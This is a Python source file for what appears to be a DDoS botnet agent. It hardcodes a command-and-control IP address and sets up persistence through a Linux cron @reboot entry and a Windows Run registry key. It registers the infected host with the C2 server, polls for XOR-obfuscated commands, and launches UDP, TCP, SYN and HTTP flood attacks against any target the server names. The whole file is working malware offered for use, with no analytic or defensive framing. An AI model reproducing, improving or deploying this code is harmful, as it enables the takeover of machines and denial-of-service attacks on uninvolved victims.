#!/usr/bin/env python3
# AVZ-Aristo Agent v27.0 – L4 атаки (UDP, TCP, SYN)
import socket, json, time, os, platform, subprocess, threading, random

C2_HOST = "80.249.146.202"
C2_PORT = 80
XOR_KEY = random.randint(1, 255)

def xor_encrypt(data, key):
    if isinstance(data, str):
        data = data.encode()
    return bytes([b ^ key for b in data])

def xor_decrypt(data, key):
    return xor_encrypt(data, key)

def get_info():
    return {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown",
        "ram": "unknown"
    }

def auto_start():
    try:
        if platform.system() == 'Linux':
            cron_line = f"@reboot /usr/bin/python3 {os.path.abspath(__file__)} &\n"
            with open("/tmp/agent_cron", "w") as f:
                f.write(cron_line)
            subprocess.run("crontab /tmp/agent_cron", shell=True)
        elif platform.system() == 'Windows':
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "AVZ Agent", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
    except:
        pass

def register():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(json.dumps({**get_info(), "xor_key": XOR_KEY}).encode())
        s.close()
    except:
        pass

def execute_attack(cmd):
    target = cmd.get("target")
    method = cmd.get("method", "GET")
    threads = int(cmd.get("threads", 10))
    port = int(cmd.get("port", 80))
    if method == "UDP":
        def udp_flood():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = b'\x00' * 1024
            for _ in range(threads):
                try:
                    s.sendto(msg, (target, port))
                except:
                    pass
        threading.Thread(target=udp_flood, daemon=True).start()
    elif method == "TCP":
        def tcp_flood():
            for _ in range(threads):
                try:
                    s = socket.socket()
                    s.connect((target, port))
                    s.send(b'\x00' * 1024)
                    s.close()
                except:
                    pass
        threading.Thread(target=tcp_flood, daemon=True).start()
    elif method == "SYN":
        try:
            from scapy.all import IP, TCP, send
            def syn_flood():
                for _ in range(threads):
                    pkt = IP(dst=target) / TCP(dport=port, flags='S')
                    send(pkt, verbose=False)
            threading.Thread(target=syn_flood, daemon=True).start()
        except ImportError:
            pass
    else:  # GET/POST
        import requests
        def http_flood():
            for _ in range(threads):
                try:
                    if method == "POST":
                        requests.post(target, data=b'data', timeout=2)
                    else:
                        requests.get(target, timeout=2)
                except:
                    pass
        threading.Thread(target=http_flood, daemon=True).start()

def send_ping():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(xor_encrypt("ping", XOR_KEY))
        data = s.recv(4096)
        s.close()
        if data and data != b"no commands":
            return json.loads(xor_decrypt(data, XOR_KEY).decode())
    except:
        pass
    return []

def main():
    auto_start()
    register()
    while True:
        cmds = send_ping()
        for cmd in cmds:
            if cmd.get("type") == "attack":
                execute_attack(cmd)
        time.sleep(15)

if __name__ == "__main__":
    main()
